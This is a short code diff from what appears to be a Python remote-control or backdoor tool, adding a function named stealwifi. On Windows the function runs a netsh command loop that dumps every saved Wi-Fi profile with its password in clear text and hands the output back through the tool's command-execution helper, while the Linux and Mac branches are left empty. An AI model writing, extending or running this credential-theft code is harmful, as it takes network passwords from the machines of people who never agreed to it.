@@ -28,6 +28,16 @@ def execute(command):
     return output.stdout.read() + output.stderr.read()
 
 
+def stealwifi(plat):
+    if plat == 'win':
+        steal = r"""for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear"""
+        return execute(steal)
+    elif plat == 'nix':
+        pass
+
+    elif plat == 'mac':
+        pass
+
 def ls(path, plat):
     if not path:
         path = '.'
